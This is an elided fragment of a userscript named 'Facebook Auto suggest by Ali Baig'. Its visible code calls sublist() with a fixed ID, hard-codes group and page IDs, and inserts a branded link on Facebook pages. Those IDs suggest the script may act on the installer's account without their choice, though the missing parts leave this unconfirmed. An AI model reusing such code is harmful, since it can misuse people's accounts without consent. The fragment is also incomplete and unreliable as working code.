// ==UserScript==
// @name            Facebook Auto suggest by Ali Baig
// @description     FAcebook Auto suggest by Ali Baig
...
sublist("244402655691958");
var gid = ['303433333093387'];
...
var spage_id = "252555874847781";
var spage_id = "423128361092394";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Ali Baig';
